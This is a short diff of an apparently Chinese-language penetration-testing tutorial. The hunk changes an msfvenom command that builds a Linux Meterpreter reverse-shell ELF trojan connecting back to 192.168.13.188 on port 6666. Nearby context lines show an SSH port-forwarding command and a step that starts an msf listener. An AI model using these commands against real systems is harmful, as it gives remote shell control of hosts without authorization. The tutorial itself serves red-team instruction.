@@ -491,7 +491,7 @@ ssh -CfNg -L 6666:<服务器IP>:6666 root@127.0.0.1 -p 4444
 生成木马，监听在客户端192.168.13.188的6666端口上
 
 ```
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.13.188 LPORT=6666 -f elf > shell.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.13.188 LPORT=6666 -f elf > shell.elf
 ```
 
 服务器打开msf，监听6666端口：
